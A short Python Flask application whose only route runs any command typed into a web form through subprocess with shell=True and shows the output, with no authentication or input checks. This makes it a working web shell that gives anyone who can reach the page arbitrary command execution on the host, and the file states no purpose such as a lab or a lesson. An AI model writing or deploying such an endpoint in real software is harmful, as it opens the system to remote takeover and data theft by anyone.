from flask import Flask, request, render_template_string
import subprocess

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def home():
    output = ""
    if request.method == 'POST':
        command = request.form.get('command')
        try:
            output = subprocess.check_output(command, shell=True, universal_newlines=True)
        except Exception as e:
            output = str(e)
    return render_template_string("""
        <form method="POST">
            Command: <input type="text" name="command">
            <input type="submit" value="Run">
        </form>
        <pre>{{output}}</pre>
    """, output=output)
